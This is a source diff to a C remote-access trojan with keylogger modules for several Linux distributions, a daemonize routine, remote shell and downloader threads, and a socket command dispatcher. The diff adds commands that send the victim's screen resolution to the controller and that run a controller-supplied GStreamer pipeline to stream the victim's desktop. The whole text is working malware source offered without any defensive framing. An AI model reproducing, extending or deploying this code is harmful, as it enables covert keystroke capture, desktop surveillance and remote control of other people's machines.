@@ -15,6 +15,7 @@
 
 #include "../includes/constants.h"
 #include "../includes/keylogger/keylogger.h"
+#include "../includes/utils.h"
 
 static SOCKET sock = 0;
 static SOCKET csock = 0;
@@ -70,11 +71,11 @@ int main(int argc, char*argv[])
         return 0;
     }
 
-    daemonize();
+    //daemonize();
 
-    ubuntu16_keylogger_init();
+    //ubuntu16_keylogger_init();
 
-    //ubuntu18_keylogger_init();
+    ubuntu18_keylogger_init();
 
     //mint_keylogger_init();
 
@@ -83,6 +84,9 @@ int main(int argc, char*argv[])
     //kali_keylogger_init();
 
     //fedora_keylogger_init();
+
+    /* Initialize GStreamer */
+    gst_init (&argc, &argv);
 
     dispatch_modules(argv);
 
@@ -114,6 +118,9 @@ void dispatch_modules(char *argv[])
     pthread_t thread_remote_shell = 0;
     pthread_t thread_downloader = 0;
     pthread_t thread_hosts_downloader = 0;
+
+    pthread_t stream_desktop = 0;
+    pthread_t send_resolution = 0;
 
 
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -335,13 +342,42 @@ void dispatch_modules(char *argv[])
             //send_hosts_file();
         }
 
-        /*
-        if(flag == x)
+        if(flag == 12)
         {
-            printf("\t\tCLOSING SERVER CONNECTION ....\n");
-            exit(1);
+            printf("\t\tSENDING RESOLUTION....\n");
+
+            if(pthread_create(&send_resolution, NULL, (void*)get_remote_screen_resolution, NULL) == -1)
+            {
+                error("pthread_create() get_remote_screen_resolution", "dispatch_modules()");
+                exit(-1);
+            }
+
+            if (pthread_join(send_resolution, NULL))
+            {
+                perror("pthread_join");
+
+                return;
+            }
+            //get_remote_screen_resolution();
         }
-        */
+
+        if(flag == 13)
+        {
+            printf("\t\tSTREAMING STARTED....\n");
+
+            if(pthread_create(&stream_desktop, NULL, (void*)execute_watch_cmd, NULL) == -1)
+            {
+                error("pthread_create() execute_watch_cmd", "dispatch_modules()");
+                exit(-1);
+            }
+
+            if (pthread_join(stream_desktop, NULL))
+            {
+                perror("pthread_join");
+
+                return;
+            }
+        }
     }
 
     return;
@@ -823,6 +859,191 @@ void *start_remote_shell(char *argv[])
 
     pthread_exit(NULL);
 }
+
+
+void *get_remote_screen_resolution()
+{
+    FILE *screen_reso_pipe = NULL;
+    const gchar *reso_cmd = "xrandr --verbose | grep *current";
+    gchar buffer_screen_reso[62] = "";
+    char *final_resolution = NULL;
+    size_t final_reso_len = 0;
+
+    screen_reso_pipe = popen(reso_cmd, "r");
+    if(screen_reso_pipe == NULL)
+    {
+        error("popen() screen_reso_pipe", "uploaded_file()");
+        exit(-1);
+    }
+
+    if(fgets(buffer_screen_reso, 62, screen_reso_pipe) == NULL)
+    {
+        error("fgets() buffer_screen_reso", "uploaded_file()");
+        exit(-1);
+    }
+
+    final_resolution = split_resolution_cmds(buffer_screen_reso);
+
+    //printf("\n\nFinal cmds = %s\n\n", final_resolution);
+
+    final_reso_len = strlen(final_resolution) + 1;
+
+    if(send(csock, (char*)&final_reso_len, sizeof(final_reso_len), 0) == SOCKET_ERROR)
+    {
+        error("send() final_reso_len", "uploaded_file()");
+        exit(-1);
+    }
+
+    if(send(csock, final_resolution, final_reso_len, 0) == SOCKET_ERROR)
+    {
+        error("send() final_resolution", "uploaded_file()");
+        exit(-1);
+    }
+
+    clean_buffer(buffer_screen_reso);
+
+    free(final_resolution);
+
+    pclose(screen_reso_pipe);
+
+    //close(csock);
+
+    pthread_exit(NULL);
+}
+
+void execute_watch_cmd()
+{
+    size_t len_watch_cmd = 0;
+    char *buffer = NULL;
+
+    GstElement *pipeline;
+    GstBus *bus;
+    GstStateChangeReturn ret;
+    GMainLoop *main_loop;
+    CustomData data;
+
+    if(recv(csock, (char*)&len_watch_cmd, sizeof(len_watch_cmd), 0) == SOCKET_ERROR)
+    {
+        error("recv() len_watch_cmd", "execute_watch_cmd()");
+        exit(-1);
+    }
+
+    buffer = malloc(len_watch_cmd * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc() buffer", "execute_watch_cmd()");
+        exit(-1);
+    }
+
+    if(recv(csock, buffer, len_watch_cmd, 0) == SOCKET_ERROR)
+    {
+        error("recv() buffer", "execute_watch_cmd()");
+        exit(-1);
+    }
+
+     /* Initialize our data structure */
+    memset (&data, 0, sizeof (data));
+
+    /* Build the pipeline */
+    pipeline = gst_parse_launch(buffer, NULL);
+    bus = gst_element_get_bus (pipeline);
+
+    /* Start playing */
+    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);
+
+    if(ret == GST_STATE_CHANGE_FAILURE)
+    {
+        g_printerr ("Unable to set the pipeline to the playing state.\n");
+        gst_object_unref (pipeline);
+        exit(-1);
+    }
+
+    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
+    {
+        data.is_live = TRUE;
+    }
+
+    main_loop = g_main_loop_new (NULL, FALSE);
+    data.loop = main_loop;
+    data.pipeline = pipeline;
+
+    gst_bus_add_signal_watch (bus);
+    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);
+
+    pthread_exit(NULL);
+
+    g_main_loop_run(main_loop);
+
+    /* Free resources */
+    g_main_loop_unref (main_loop);
+    gst_object_unref (bus);
+    gst_element_set_state (pipeline, GST_STATE_NULL);
+    gst_object_unref (pipeline);
+
+    free(buffer);
+
+    close(csock);
+
+}
+
+void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
+{
+    switch (GST_MESSAGE_TYPE (msg))
+    {
+        case GST_MESSAGE_ERROR:
+        {
+            GError *err;
+            gchar *debug;
+
+            gst_message_parse_error (msg, &err, &debug);
+            g_print ("Error: %s\n", err->message);
+            g_error_free (err);
+            g_free (debug);
+
+            gst_element_set_state (data->pipeline, GST_STATE_READY);
+            g_main_loop_quit (data->loop);
+            break;
+        }
+
+        case GST_MESSAGE_EOS:
+            /* end-of-stream */
+            gst_element_set_state (data->pipeline, GST_STATE_READY);
+            g_main_loop_quit (data->loop);
+            break;
+
+        case GST_MESSAGE_BUFFERING:
+        {
+            gint percent = 0;
+
+            /* If the stream is live, we do not care about buffering. */
+            if (data->is_live) break;
+
+            gst_message_parse_buffering (msg, &percent);
+            g_print ("Buffering (%3d%%)\r", percent);
+
+            /* Wait until buffering is complete before start/resume playing */
+            if (percent < 100)
+                gst_element_set_state (data->pipeline, GST_STATE_PAUSED);
+
+            else
+                gst_element_set_state (data->pipeline, GST_STATE_PLAYING);
+
+            break;
+        }
+
+        case GST_MESSAGE_CLOCK_LOST:
+
+            /* Get a new clock */
+            gst_element_set_state (data->pipeline, GST_STATE_PAUSED);
+            gst_element_set_state (data->pipeline, GST_STATE_PLAYING);
+            break;
+
+        default:
+            /* Unhandled message */
+            break;
+    }
+}
+
 
 
 void daemonize()
